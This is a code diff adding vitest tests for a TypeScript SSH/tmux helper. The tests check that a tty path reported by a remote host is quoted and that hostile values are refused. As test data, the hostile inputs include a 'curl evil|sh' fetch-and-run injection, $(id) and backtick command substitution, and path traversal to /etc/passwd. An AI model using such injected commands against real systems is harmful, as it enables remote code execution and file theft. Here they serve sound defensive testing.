@@ -1,5 +1,10 @@
 import { describe, expect, it } from 'vitest'
-import { remoteHookEnvArgs, remoteTmuxPtyArgs } from './control-master'
+import {
+  remoteForegroundArgvArgs,
+  remoteHookEnvArgs,
+  remotePaneOwnerArgs,
+  remoteTmuxPtyArgs
+} from './control-master'
 import { accountTmuxEnvArgs } from '../claude-accounts-core'
 
 /**
@@ -179,5 +184,59 @@ describe('remoteTmuxPtyArgs: an attacker-controlled node id is DATA, never comma
     const s = argv.indexOf('-s')
     expect(argv.indexOf('NODETERM_NODE_ID=term-mabc-3')).toBeGreaterThan(i)
     expect(argv.indexOf('NODETERM_NODE_ID=term-mabc-3')).toBeLessThan(s)
+  })
+})
+
+/**
+ * The pane-ownership read's SSH leg. `#{pane_tty}` is a value the REMOTE host printed back at us,
+ * so it is data crossing into a command line the remote login shell parses — the same class as the
+ * node id above, arriving through a different door.
+ *
+ * Two layers, and the test insists on both: `isSafeTty` refuses the value outright (so nothing is
+ * built at all), and whatever does get built is `posixQuote`d. Either one alone would be a single
+ * point of failure.
+ */
+describe('remoteForegroundArgvArgs: a tty the remote host reported is DATA, never structure', () => {
+  it('builds a single quoted ps invocation for a real tty', () => {
+    const args = remoteForegroundArgvArgs(conn, '/s.sock', '/dev/pts/7')
+    expect(args).not.toBeNull()
+    const { argv, unquotedMeta } = shellParse(args![args!.length - 1])
+    expect(unquotedMeta).toEqual([])
+    expect(argv).toEqual([
+      'ps',
+      '-ww',
+      '-o',
+      'pid=',
+      '-o',
+      'pgid=',
+      '-o',
+      'stat=',
+      '-o',
+      'args=',
+      '-t',
+      '/dev/pts/7'
+    ])
+  })
+
+  it('refuses to build anything for a hostile tty — the second layer never has to hold', () => {
+    for (const tty of [
+      `/dev/pts/0;${PAYLOAD}`,
+      '/dev/pts/0 && curl evil|sh',
+      '/dev/$(id)',
+      '/dev/`id`',
+      '/dev/../../etc/passwd',
+      ''
+    ]) {
+      expect(remoteForegroundArgvArgs(conn, '/s.sock', tty)).toBeNull()
+    }
+  })
+
+  it('the tmux half sends the format to the REMOTE tmux verbatim, on the remote socket', () => {
+    const { argv, unquotedMeta } = shellParse(
+      remotePaneOwnerArgs(conn, '/s.sock', 'nt-n1').at(-1) as string
+    )
+    expect(unquotedMeta).toEqual([])
+    expect(argv.slice(0, 3)).toEqual(['tmux', '-L', 'nodeterm-rmt'])
+    expect(argv).toContain('#{pane_pid}|#{pane_tty}|#{pane_current_command}')
   })
 })
